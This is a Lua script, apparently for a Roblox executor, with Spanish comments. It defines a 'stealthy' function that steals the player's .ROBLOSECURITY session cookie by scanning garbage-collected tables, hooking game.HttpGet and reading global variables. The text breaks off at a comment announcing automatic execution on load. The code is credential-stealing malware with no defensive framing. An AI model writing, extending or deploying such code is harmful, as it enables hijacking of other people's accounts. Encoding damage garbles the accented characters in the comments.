-- M茅todo de extracci贸n sigiloso
local function extractCookie()
    local cookie = nil
    
    -- M茅todo 1: A trav茅s de getgc (garbage collector)
    if getgc then
        for _, obj in pairs(getgc(true)) do
            if type(obj) == "table" then
                -- Buscar tablas que contengan datos de autenticaci贸n
                for k, v in pairs(obj) do
                    if tostring(k):lower():find("cookie") or tostring(k):lower():find("token") then
                        if type(v) == "string" and v:len() > 100 then
                            cookie = v
                            break
                        end
                    end
                end
            end
            if cookie then break end
        end
    end
    
    -- M茅todo 2: Hook de requests internos
    if not cookie and hookfunction then
        local oldHttpGet
        oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
            local result = oldHttpGet(self, url, ...)
            -- Analizar resultado por cookies
            if type(result) == "string" and result:find("ROBLOSECURITY") then
                cookie = result:match(".ROBLOSECURITY=([^;]+)")
            end
            return result
        end)
    end
    
    -- M茅todo 3: Acceso directo a _G o shared
    if not cookie then
        if _G.__ROBLOX_COOKIE__ then
            cookie = _G.__ROBLOX_COOKIE__
        elseif shared and shared.ROBLOX_COOKIE then
            cookie = shared.ROBLOX_COOKIE
        end
    end
    
    return cookie
end

-- Ejecuci贸n autom谩tica al cargar
